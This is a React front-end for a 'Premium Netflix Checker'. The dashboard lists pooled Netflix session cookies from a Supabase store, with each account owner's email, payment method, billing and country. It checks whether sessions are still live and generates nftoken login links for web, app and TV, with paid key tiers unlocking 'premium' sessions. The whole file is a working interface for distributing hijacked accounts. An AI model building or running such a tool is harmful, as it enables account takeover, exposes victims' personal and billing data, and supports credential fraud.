import { useState, type ReactNode } from "react";
import { useQuery, useMutation } from "@tanstack/react-query";
import { apiRequest } from "@/lib/queryClient";
import type { CookieSession, CheckResult } from "@shared/schema";
import { useToast } from "@/hooks/use-toast";
import logoImg from "@assets/icon-128_1771330377572.png";
import {
  Activity,
  CheckCircle2,
  CreditCard,
  Crown,
  Globe,
  Loader2,
  Lock,
  LogOut,
  Mail,
  Play,
  SearchCheck,
  Server,
  Shield,
  Smartphone,
  Sparkles,
  Tv,
  Users,
  XCircle,
  type LucideIcon,
} from "lucide-react";

function countryCodeFromValue(value?: string) {
  const tokens = value?.toUpperCase().match(/\b[A-Z]{2}\b/g);
  return tokens?.at(-1) || "";
}

function countryFlagUrlFromValue(value?: string) {
  const code = countryCodeFromValue(value);
  if (!/^[A-Z]{2}$/.test(code)) return "";
  return `https://flagcdn.com/w40/${code.toLowerCase()}.png`;
}

function displayCountryValue(value?: string) {
  const trimmed = value?.trim();
  if (!trimmed) return "";

  const code = countryCodeFromValue(trimmed);
  if (!code) return trimmed;

  const parts = trimmed.split(/\s+/);
  while (parts.length > 1 && parts.at(-1)?.toUpperCase() === code && parts.at(-2)?.toUpperCase() === code) {
    parts.pop();
  }

  return parts.join(" ");
}

function CountryValue({ value }: { value?: string }) {
  const displayValue = displayCountryValue(value);
  if (!displayValue) return null;

  const flagUrl = countryFlagUrlFromValue(value);

  return (
    <span className="inline-flex min-w-0 items-center gap-2">
      {flagUrl && (
        <img
          src={flagUrl}
          alt=""
          loading="lazy"
          className="h-3.5 w-5 shrink-0 rounded-[3px] object-cover ring-1 ring-white/15"
        />
      )}
      <span className="min-w-0 truncate">{displayValue}</span>
    </span>
  );
}

function InfoTile({
  icon: Icon,
  label,
  value,
  highlight,
  children,
}: {
  icon: LucideIcon;
  label: string;
  value?: string;
  highlight?: boolean;
  children?: ReactNode;
}) {
  if (!value && !children) return null;
  return (
    <div className="min-w-0 rounded-2xl border border-white/10 bg-white/[0.035] p-4 transition-colors hover:border-white/15 hover:bg-white/[0.055]">
      <div className="flex items-center gap-2 text-xs font-medium uppercase tracking-[0.14em] text-neutral-500">
        <Icon className="h-4 w-4 shrink-0" />
        <span>{label}</span>
      </div>
      <div className={`mt-2 min-w-0 break-words text-sm font-semibold leading-6 ${highlight ? "text-emerald-300" : "text-white"}`}>
        {children || value}
      </div>
    </div>
  );
}

function buildNetflixLink(watchLink: string, targetPath: string): string {
  const match = watchLink.match(/nftoken=([^&\s]+)/);
  if (match) {
    const token = match[1];
    return `https://netflix.com/?nftoken=${token}&nextPage=${encodeURIComponent(`/${targetPath}`)}`;
  }
  return watchLink.replace(/^(https:\/\/netflix\.com\/)[^?]*/, `$1${targetPath}`);
}

function ResultPanel({
  result,
  isChecking,
}: {
  result: CheckResult | null;
  isChecking: boolean;
}) {
  if (isChecking) {
    return (
      <div className="flex flex-col items-center justify-center gap-5 py-16 sm:py-20">
        <div className="relative">
          <div className="h-16 w-16 rounded-full border border-white/10 bg-white/[0.04]" />
          <div className="absolute inset-0 rounded-full border-[3px] border-red-500 border-t-transparent animate-spin" />
          <SearchCheck className="absolute inset-0 m-auto h-6 w-6 text-red-300" />
        </div>
        <div className="text-center">
          <p className="text-sm font-semibold text-white">Verifying account</p>
          <p className="mt-1 text-xs text-neutral-500">Checking session health and membership details...</p>
        </div>
      </div>
    );
  }

  if (!result) return null;

  if (!result.valid) {
    return (
      <div className="flex flex-col items-center justify-center gap-4 py-14 sm:py-16">
        <div className="flex h-16 w-16 items-center justify-center rounded-2xl border border-red-500/20 bg-red-500/10 shadow-lg shadow-red-950/30">
          <XCircle className="h-8 w-8 text-red-300" />
        </div>
        <div className="text-center">
          <p className="text-base font-semibold text-white">Invalid or expired session</p>
          {result.error && (
            <p className="mx-auto mt-2 max-w-xs text-sm leading-6 text-neutral-500">{result.error}</p>
          )}
        </div>
      </div>
    );
  }

  const directWatchLink = result.watchLink ? buildNetflixLink(result.watchLink, "browse") : undefined;
  const appWatchLink = result.watchLink ? buildNetflixLink(result.watchLink, "unsupported") : undefined;
  const tvWatchLink = result.watchLink ? buildNetflixLink(result.watchLink, "tv8") : undefined;

  return (
    <div className="space-y-5">
      <div className="flex flex-wrap items-center gap-3 rounded-2xl border border-emerald-400/15 bg-emerald-400/10 px-4 py-3">
        <div className="flex h-9 w-9 items-center justify-center rounded-xl bg-emerald-400/15">
          <CheckCircle2 className="h-5 w-5 text-emerald-300" />
        </div>
        <div>
          <p className="text-sm font-semibold text-emerald-200">Valid account</p>
          <p className="text-xs text-emerald-100/60">Session passed all available checks.</p>
        </div>
        {result.plan && (
          <span className="ml-auto rounded-full border border-red-400/20 bg-red-500/10 px-3 py-1 text-xs font-semibold text-red-200">
            {result.plan}
          </span>
        )}
      </div>

      <div className="grid gap-3 sm:grid-cols-2 lg:grid-cols-3">
        <InfoTile icon={Shield} label="Status" value={result.status} highlight />
        <InfoTile icon={CreditCard} label="Premium" value={result.premium} />
        <InfoTile icon={Globe} label="Country" value={result.country}>
          <CountryValue value={result.country} />
        </InfoTile>
        <InfoTile icon={Tv} label="Plan" value={result.plan} />
        <InfoTile icon={CreditCard} label="Price" value={result.price} />
        <InfoTile icon={Users} label="Member Since" value={result.memberSince} />
        <InfoTile icon={CreditCard} label="Payment" value={result.paymentMethod} />
        <InfoTile icon={Mail} label="Email" value={result.email} />
        <InfoTile icon={Shield} label="Verified" value={result.emailVerified} />
        <InfoTile icon={Tv} label="Quality" value={result.videoQuality} />
        <InfoTile icon={Users} label="Max Streams" value={result.maxStreams} />
        <InfoTile icon={Users} label="Extra Member" value={result.extraMember} />
        <InfoTile icon={Users} label="Profiles" value={result.profiles} />
        <InfoTile icon={CreditCard} label="Billing" value={result.billing} />
      </div>

      {directWatchLink && (
        <div className="grid gap-3 lg:grid-cols-3">
          <a
            href={directWatchLink}
            target="_blank"
            rel="noopener noreferrer"
            data-testid="button-direct-watch"
            className="group flex items-center justify-between gap-4 rounded-2xl bg-gradient-to-r from-red-600 to-red-500 px-5 py-4 text-white shadow-lg shadow-red-950/30 transition-all hover:-translate-y-0.5 hover:from-red-500 hover:to-red-400 hover:shadow-red-950/45"
          >
            <span className="flex min-w-0 items-center gap-3">
              <span className="rounded-xl bg-white/15 p-2.5 transition group-hover:bg-white/25">
                <Play className="h-4 w-4" />
              </span>
              <span className="min-w-0 text-left">
                <span className="block text-sm font-semibold uppercase tracking-wide">Watch now</span>
                <span className="block truncate text-xs text-red-100/80">Open Netflix web</span>
              </span>
            </span>
          </a>
          <a
            href={appWatchLink}
            target="_blank"
            rel="noopener noreferrer"
            data-testid="button-netflix-app"
            className="group flex items-center justify-between gap-4 rounded-2xl border border-white/10 bg-gradient-to-r from-neutral-800 to-neutral-700 px-5 py-4 text-white shadow-lg shadow-black/20 transition-all hover:-translate-y-0.5 hover:border-white/20 hover:from-neutral-700 hover:to-neutral-600"
          >
            <span className="flex min-w-0 items-center gap-3">
              <span className="rounded-xl bg-white/10 p-2.5 transition group-hover:bg-white/20">
                <Smartphone className="h-4 w-4" />
              </span>
              <span className="min-w-0 text-left">
                <span className="block text-sm font-semibold">Watch on Netflix App</span>
                <span className="block truncate text-xs text-neutral-300">Open mobile app route</span>
              </span>
            </span>
          </a>
          <a
            href={tvWatchLink}
            target="_blank"
            rel="noopener noreferrer"
            data-testid="button-watch-tv"
            className="group flex items-center justify-between gap-4 rounded-2xl bg-gradient-to-r from-amber-400 to-yellow-500 px-5 py-4 text-black shadow-lg shadow-amber-950/20 transition-all hover:-translate-y-0.5 hover:from-amber-300 hover:to-yellow-400"
          >
            <span className="flex min-w-0 items-center gap-3">
              <span className="rounded-xl bg-black/10 p-2.5 transition group-hover:bg-black/15">
                <Tv className="h-4 w-4" />
              </span>
              <span className="min-w-0 text-left">
                <span className="block text-sm font-semibold">Watch on TV</span>
                <span className="block truncate text-xs text-black/60">Open TV mode route</span>
              </span>
            </span>
          </a>
        </div>
      )}
    </div>
  );
}

function TierBadge({ isPremium }: { isPremium: boolean }) {
  if (isPremium) {
    return (
      <span className="flex items-center gap-1.5 rounded-full border border-amber-400/20 bg-amber-400/10 px-3 py-1" data-testid="badge-tier">
        <Crown className="h-3.5 w-3.5 text-amber-300" />
        <span className="text-[11px] font-semibold uppercase tracking-[0.14em] text-amber-200">Premium</span>
      </span>
    );
  }

  return (
    <span className="rounded-full border border-white/10 bg-white/[0.04] px-3 py-1 text-[11px] font-semibold uppercase tracking-[0.14em] text-neutral-400" data-testid="badge-tier">
      Free
    </span>
  );
}

const PAGE_SIZE = 12;

function textValue(value?: string | null) {
  return value?.trim() || "";
}

function getSessionStatus(session: CookieSession) {
  return textValue(session.status) || "Available";
}

function getSessionPlan(session: CookieSession) {
  return textValue(session.plan) || textValue(session.premium) || (session.is_premium ? "Premium" : "Standard");
}

function getSessionCountry(session: CookieSession) {
  return textValue(session.country) || "—";
}

function getSessionEmail(session: CookieSession) {
  return textValue(session.email) || "—";
}

function uniqueValues(values: string[]) {
  return Array.from(new Set(values.filter(Boolean))).sort((a, b) => a.localeCompare(b));
}

interface HomeProps {
  onLogout: () => void;
}

export default function Home({ onLogout }: HomeProps) {
  const [selectedSession, setSelectedSession] = useState<CookieSession | null>(null);
  const [checkResult, setCheckResult] = useState<CheckResult | null>(null);
  const [sessionResults, setSessionResults] = useState<Record<number, CheckResult>>({});
  const [searchQuery, setSearchQuery] = useState("");
  const [planFilter, setPlanFilter] = useState("all");
  const [countryFilter, setCountryFilter] = useState("all");
  const [page, setPage] = useState(1);
  const { toast } = useToast();

  const { data: cookieData, isLoading } = useQuery<{ sessions: CookieSession[]; userIsPremium: boolean }>({
    queryKey: ["/api/cookies"],
  });

  const sessions = cookieData?.sessions ?? [];
  const isPremium = cookieData?.userIsPremium === true;
  const premiumSessions = sessions.filter((session) => session.is_premium).length;
  const availableSessions = sessions.filter((session) => !session.is_premium || isPremium).length;
  const checkMutation = useMutation({
    mutationFn: async (sessionId: number) => {
      const res = await apiRequest("POST", "/api/check", { sessionId });
      return (await res.json()) as CheckResult;
    },
    onSuccess: (data, sessionId) => {
      setCheckResult(data);
      setSessionResults((current) => ({ ...current, [sessionId]: data }));
      if (!data.valid) {
        toast({ title: "Cookie is invalid or expired", variant: "destructive" });
      }
    },
    onError: (err: Error) => {
      toast({ title: "Check failed", description: err.message, variant: "destructive" });
    },
  });

  const handleSelect = (session: CookieSession) => {
    if (session.is_premium && !isPremium) {
      toast({ title: "Premium cookie", description: "Upgrade your key to access premium sessions", variant: "destructive" });
      return;
    }
    setSelectedSession(session);
    setCheckResult(null);
    checkMutation.mutate(session.id);
  };

  const handleCloseDetails = () => {
    setSelectedSession(null);
    setCheckResult(null);
  };

  const planOptions = uniqueValues(sessions.map(getSessionPlan));
  const countryOptions = uniqueValues(sessions.map(getSessionCountry).filter((value) => value !== "—"));
  const query = searchQuery.trim().toLowerCase();
  const filteredSessions = sessions.filter((session) => {
    const plan = getSessionPlan(session);
    const country = getSessionCountry(session);
    const email = getSessionEmail(session);
    const searchable = [
      session.description || "",
      getSessionStatus(session),
      plan,
      country,
      email,
    ].join(" ").toLowerCase();

    return (query === "" || searchable.includes(query)) && (planFilter === "all" || plan === planFilter) && (countryFilter === "all" || country === countryFilter);
  });
  const totalPages = Math.max(1, Math.ceil(filteredSessions.length / PAGE_SIZE));
  const currentPage = Math.min(page, totalPages);
  const paginatedSessions = filteredSessions.slice((currentPage - 1) * PAGE_SIZE, currentPage * PAGE_SIZE);
  const startItem = filteredSessions.length === 0 ? 0 : (currentPage - 1) * PAGE_SIZE + 1;
  const endItem = Math.min(currentPage * PAGE_SIZE, filteredSessions.length);

  const stats = [
    { label: "Total sessions", value: isLoading ? "—" : sessions.length.toString(), icon: Server },
    { label: "Available", value: isLoading ? "—" : availableSessions.toString(), icon: Activity },
    { label: "Premium pool", value: isLoading ? "—" : premiumSessions.toString(), icon: Crown },
  ];

  return (
    <div className="relative min-h-screen overflow-hidden bg-[#07090f] text-white">
      <div className="pointer-events-none fixed inset-0">
        <div className="absolute left-[-12rem] top-[-12rem] h-[32rem] w-[32rem] rounded-full bg-red-600/20 blur-[130px]" />
        <div className="absolute bottom-[-10rem] right-[-8rem] h-[28rem] w-[28rem] rounded-full bg-sky-500/10 blur-[120px]" />
        <div className="absolute inset-0 bg-[linear-gradient(rgba(255,255,255,.03)_1px,transparent_1px),linear-gradient(90deg,rgba(255,255,255,.03)_1px,transparent_1px)] bg-[size:84px_84px] [mask-image:linear-gradient(to_bottom,black,transparent_90%)]" />
      </div>

      <header className="sticky top-0 z-20 border-b border-white/10 bg-[#07090f]/75 backdrop-blur-2xl">
        <div className="mx-auto flex max-w-7xl items-center justify-between px-4 py-4 sm:px-6 lg:px-8">
          <div className="flex min-w-0 items-center gap-3">
            <div className="relative shrink-0">
              <div className="absolute inset-0 rounded-xl bg-red-500/25 blur-md" />
              <img src={logoImg} alt="Premium Netflix" className="relative h-10 w-10 rounded-xl ring-1 ring-white/10" data-testid="img-logo" />
            </div>
            <div className="min-w-0">
              <h1 className="truncate text-base font-semibold tracking-tight sm:text-lg" data-testid="text-title">Premium Netflix</h1>
              <p className="hidden text-xs text-neutral-500 sm:block">Professional session verification console</p>
            </div>
            <TierBadge isPremium={isPremium} />
          </div>
          <button
            onClick={onLogout}
            data-testid="button-logout"
            className="flex items-center gap-2 rounded-full border border-white/10 bg-white/[0.045] px-3 py-2 text-xs font-medium text-neutral-300 transition-all hover:border-white/20 hover:bg-white/[0.075] hover:text-white"
          >
            <LogOut className="h-3.5 w-3.5" />
            <span className="hidden sm:inline">Logout</span>
          </button>
        </div>
      </header>

      <main className="relative mx-auto w-full max-w-7xl px-4 py-6 sm:px-6 sm:py-8 lg:px-8">
        <div className="space-y-6">
          <section className="grid gap-3 lg:grid-cols-[minmax(0,1.35fr)_repeat(3,minmax(0,.55fr))]" data-testid="dashboard-topbar">
            <div className="rounded-[1.75rem] border border-white/10 bg-white/[0.06] p-5 shadow-2xl shadow-black/30 backdrop-blur-2xl">
              <div className="flex items-center gap-2 rounded-full border border-red-400/15 bg-red-500/10 px-3 py-1 text-[11px] font-semibold uppercase tracking-[0.18em] text-red-200 w-fit">
                <Sparkles className="h-3.5 w-3.5" />
                Verification hub
              </div>
              <div className="mt-4 flex flex-wrap items-end justify-between gap-4">
                <div>
                  <h2 className="text-2xl font-semibold tracking-tight">Account directory</h2>
                  <p className="mt-2 max-w-2xl text-sm leading-6 text-neutral-400">
                    Browse Supabase account data, filter by plan/country/email, then open a card to generate nftoken links.
                  </p>
                </div>
                <span className="rounded-full border border-white/10 bg-white/[0.045] px-3 py-1 text-xs font-medium text-neutral-400">
                  {filteredSessions.length} visible
                </span>
              </div>
            </div>

            {stats.map((stat) => (
              <div key={stat.label} className="rounded-[1.35rem] border border-white/10 bg-white/[0.05] p-4 backdrop-blur-xl">
                <div className="flex items-center justify-between gap-3">
                  <div>
                    <p className="text-[11px] font-medium uppercase tracking-[0.16em] text-neutral-500">{stat.label}</p>
                    <p className="mt-2 text-2xl font-semibold text-white">{stat.value}</p>
                  </div>
                  <div className="rounded-2xl border border-white/10 bg-white/[0.05] p-3">
                    <stat.icon className="h-5 w-5 text-red-300" />
                  </div>
                </div>
              </div>
            ))}
          </section>

          <section className="space-y-5">
            {selectedSession ? (
              <div className="overflow-hidden rounded-[1.75rem] border border-white/10 bg-white/[0.06] shadow-2xl shadow-black/25 backdrop-blur-2xl" data-testid="account-detail-card">
                <div className="border-b border-white/10 bg-white/[0.025] px-5 py-5 sm:px-6">
                  <div className="flex flex-wrap items-center justify-between gap-4">
                    <div className="flex min-w-0 items-center gap-4">
                      <div className="hidden rounded-3xl border border-red-400/20 bg-red-500/10 p-3 text-red-200 sm:block">
                        <Shield className="h-6 w-6" />
                      </div>
                      <div className="min-w-0">
                        <p className="text-xs font-semibold uppercase tracking-[0.18em] text-neutral-500">Account #{selectedSession.id}</p>
                        <h2 className="mt-1 truncate text-2xl font-semibold tracking-tight text-white">{selectedSession.description || getSessionEmail(selectedSession)}</h2>
                        <div className="mt-3 flex flex-wrap gap-2">
                          <span className="rounded-full border border-emerald-400/20 bg-emerald-400/10 px-3 py-1 text-xs font-semibold text-emerald-200">{getSessionStatus(selectedSession)}</span>
                          <span className="rounded-full border border-white/10 bg-white/[0.045] px-3 py-1 text-xs font-semibold text-neutral-300">{getSessionPlan(selectedSession)}</span>
                          <span className="rounded-full border border-white/10 bg-white/[0.045] px-3 py-1 text-xs font-semibold text-neutral-300">{getSessionCountry(selectedSession)}</span>
                        </div>
                      </div>
                    </div>
                    <button
                      type="button"
                      onClick={handleCloseDetails}
                      className="rounded-full border border-white/10 bg-white/[0.06] px-4 py-2 text-xs font-semibold text-neutral-200 transition-all hover:border-red-300/35 hover:bg-red-500/10 hover:text-white"
                      data-testid="button-close-details"
                    >
                      Back to accounts
                    </button>
                  </div>
                </div>

                <div className="p-4 sm:p-6">
                  <div className="rounded-[1.35rem] border border-white/10 bg-black/25 p-4 sm:p-5" data-testid="result-panel">
                    <div className="mb-5 flex flex-wrap items-center justify-between gap-3">
                      <div>
                        <p className="text-xs font-semibold uppercase tracking-[0.18em] text-neutral-500">Generated account details</p>
                        <h3 className="mt-1 text-lg font-semibold tracking-tight text-white">Live nftoken result</h3>
                      </div>
                      <span className="rounded-full border border-white/10 bg-white/[0.045] px-3 py-1 text-xs font-medium text-neutral-400">
                        {checkMutation.isPending ? "Generating" : checkResult ? "Ready" : "Pending"}
                      </span>
                    </div>
                    <ResultPanel result={checkResult} isChecking={checkMutation.isPending} />
                  </div>
                </div>
              </div>
            ) : (
              <div className="overflow-hidden rounded-[1.75rem] border border-white/10 bg-white/[0.06] shadow-2xl shadow-black/20 backdrop-blur-2xl" data-testid="account-card-list">
                <div className="border-b border-white/10 px-5 py-4 sm:px-6">
                  <div className="flex flex-wrap items-center justify-between gap-3">
                    <div>
                      <p className="text-xs font-semibold uppercase tracking-[0.18em] text-neutral-500">Account cards</p>
                      <h2 className="mt-1 text-xl font-semibold tracking-tight text-white">Supabase account data</h2>
                    </div>
                    {!isLoading && sessions.length > 0 && (
                      <span className="rounded-full border border-white/10 bg-white/[0.045] px-3 py-1 text-xs font-medium text-neutral-400">
                        Showing {startItem}-{endItem} of {filteredSessions.length}
                      </span>
                    )}
                  </div>

                  <div className="mt-4 grid gap-3 lg:grid-cols-[minmax(0,1fr)_12rem_12rem]">
                    <label className="relative block">
                      <SearchCheck className="pointer-events-none absolute left-3 top-1/2 h-4 w-4 -translate-y-1/2 text-neutral-500" />
                      <input
                        value={searchQuery}
                        onChange={(event) => {
                          setSearchQuery(event.target.value);
                          setPage(1);
                        }}
                        placeholder="Search plan, country, or email..."
                        className="h-11 w-full rounded-2xl border border-white/10 bg-black/25 pl-10 pr-3 text-sm text-white outline-none transition placeholder:text-neutral-600 focus:border-red-300/35 focus:bg-black/35"
                        data-testid="input-account-search"
                      />
                    </label>
                    <select
                      value={planFilter}
                      onChange={(event) => {
                        setPlanFilter(event.target.value);
                        setPage(1);
                      }}
                      className="h-11 rounded-2xl border border-white/10 bg-black/25 px-3 text-sm text-white outline-none transition focus:border-red-300/35"
                      data-testid="select-plan-filter"
                    >
                      <option value="all">All plans</option>
                      {planOptions.map((plan) => (
                        <option key={plan} value={plan}>{plan}</option>
                      ))}
                    </select>
                    <select
                      value={countryFilter}
                      onChange={(event) => {
                        setCountryFilter(event.target.value);
                        setPage(1);
                      }}
                      className="h-11 rounded-2xl border border-white/10 bg-black/25 px-3 text-sm text-white outline-none transition focus:border-red-300/35"
                      data-testid="select-country-filter"
                    >
                      <option value="all">All countries</option>
                      {countryOptions.map((country) => (
                        <option key={country} value={country}>{country}</option>
                      ))}
                    </select>
                  </div>
                </div>

                <div className="grid gap-3 p-4 sm:grid-cols-2 sm:p-5 xl:grid-cols-3">
                  {isLoading ? (
                    Array.from({ length: 6 }).map((_, index) => (
                      <div key={index} className="min-h-52 rounded-3xl border border-white/10 bg-white/[0.04] p-4">
                        <div className="flex items-center gap-3">
                          <Loader2 className="h-5 w-5 animate-spin text-neutral-500" />
                          <span className="text-sm text-neutral-500">Loading account...</span>
                        </div>
                      </div>
                    ))
                  ) : sessions.length === 0 ? (
                    <div className="col-span-full rounded-3xl border border-dashed border-white/10 bg-white/[0.025] px-6 py-12 text-center text-sm text-neutral-500">
                      No account sessions are available yet.
                    </div>
                  ) : filteredSessions.length === 0 ? (
                    <div className="col-span-full rounded-3xl border border-dashed border-white/10 bg-white/[0.025] px-6 py-12 text-center text-sm text-neutral-500">
                      No accounts match the current search and filters.
                    </div>
                  ) : (
                    paginatedSessions.map((session) => {
                      const locked = session.is_premium && !isPremium;
                      const summary = sessionResults[session.id];
                      const checking = checkMutation.isPending && checkMutation.variables === session.id;
                      const unavailable = checkMutation.isPending && checkMutation.variables !== session.id;
                      const status = locked ? "Premium locked" : summary?.status || getSessionStatus(session);
                      const plan = getSessionPlan(session);
                      const country = getSessionCountry(session);
                      const email = getSessionEmail(session);

                      return (
                        <button
                          key={session.id}
                          type="button"
                          data-testid={`cookie-item-${session.id}`}
                          onClick={() => handleSelect(session)}
                          disabled={locked || unavailable}
                          className={`group min-h-52 rounded-3xl border p-4 text-left transition-all ${
                            locked
                              ? "cursor-not-allowed border-amber-500/10 bg-amber-500/[0.03] opacity-60"
                              : "border-white/10 bg-white/[0.04] hover:-translate-y-0.5 hover:border-white/20 hover:bg-white/[0.07]"
                          }`}
                        >
                          <div className="flex items-start justify-between gap-3">
                            <div className="min-w-0">
                              <p className="text-[11px] font-semibold uppercase tracking-[0.16em] text-neutral-500">Account #{session.id}</p>
                              <h3 className="mt-1 truncate text-base font-semibold text-white">{session.description || email}</h3>
                            </div>
                            {session.is_premium ? (
                              <span className={`flex shrink-0 items-center gap-1 rounded-full border px-2 py-1 text-[10px] font-semibold uppercase ${locked ? "border-amber-600/20 bg-amber-600/10 text-amber-600" : "border-amber-400/20 bg-amber-400/10 text-amber-200"}`}>
                                {locked ? <Lock className="h-3 w-3" /> : <Crown className="h-3 w-3" />}
                                Premium
                              </span>
                            ) : (
                              <span className="shrink-0 rounded-full border border-white/10 bg-white/[0.04] px-2 py-1 text-[10px] font-semibold uppercase text-neutral-500">Free</span>
                            )}
                          </div>

                          <div className="mt-4 grid gap-2 text-xs">
                            <div className="flex items-center justify-between gap-3 rounded-2xl bg-black/20 px-3 py-2">
                              <span className="text-neutral-500">Status</span>
                              <span className={`truncate font-semibold ${locked ? "text-amber-500" : summary?.valid ? "text-emerald-300" : "text-neutral-300"}`}>{status}</span>
                            </div>
                            <div className="flex items-center justify-between gap-3 rounded-2xl bg-black/20 px-3 py-2">
                              <span className="text-neutral-500">Plan</span>
                              <span className="truncate font-semibold text-white">{plan}</span>
                            </div>
                            <div className="flex items-center justify-between gap-3 rounded-2xl bg-black/20 px-3 py-2">
                              <span className="text-neutral-500">Country</span>
                              <span className="min-w-0 truncate font-semibold text-white"><CountryValue value={country} /></span>
                            </div>
                            <div className="flex items-center justify-between gap-3 rounded-2xl bg-black/20 px-3 py-2">
                              <span className="text-neutral-500">Email</span>
                              <span className="truncate font-semibold text-white">{email}</span>
                            </div>
                          </div>

                          <div className="mt-4 flex items-center justify-between gap-3 text-xs">
                            <span className="text-neutral-500">Click for full info + nftoken</span>
                            {checking ? (
                              <Loader2 className="h-4 w-4 animate-spin text-red-300" />
                            ) : summary?.watchLink ? (
                              <CheckCircle2 className="h-4 w-4 text-emerald-300" />
                            ) : null}
                          </div>
                        </button>
                      );
                    })
                  )}
                </div>

                {!isLoading && filteredSessions.length > 0 && (
                  <div className="flex flex-wrap items-center justify-between gap-3 border-t border-white/10 px-5 py-4 text-sm text-neutral-400 sm:px-6">
                    <span>Page {currentPage} of {totalPages}</span>
                    <div className="flex items-center gap-2">
                      <button
                        type="button"
                        onClick={() => setPage((value) => Math.max(1, value - 1))}
                        disabled={currentPage === 1}
                        className="rounded-full border border-white/10 bg-white/[0.045] px-4 py-2 text-xs font-semibold text-neutral-300 transition-all hover:border-white/20 hover:bg-white/[0.075] disabled:cursor-not-allowed disabled:opacity-40"
                        data-testid="button-prev-page"
                      >
                        Previous
                      </button>
                      <button
                        type="button"
                        onClick={() => setPage((value) => Math.min(totalPages, value + 1))}
                        disabled={currentPage === totalPages}
                        className="rounded-full border border-white/10 bg-white/[0.045] px-4 py-2 text-xs font-semibold text-neutral-300 transition-all hover:border-white/20 hover:bg-white/[0.075] disabled:cursor-not-allowed disabled:opacity-40"
                        data-testid="button-next-page"
                      >
                        Next
                      </button>
                    </div>
                  </div>
                )}
              </div>
            )}
          </section>
        </div>
      </main>

      <footer className="relative border-t border-white/10 py-5">
        <p className="text-center text-xs text-neutral-600">Premium Netflix Checker</p>
      </footer>
    </div>
  );
}
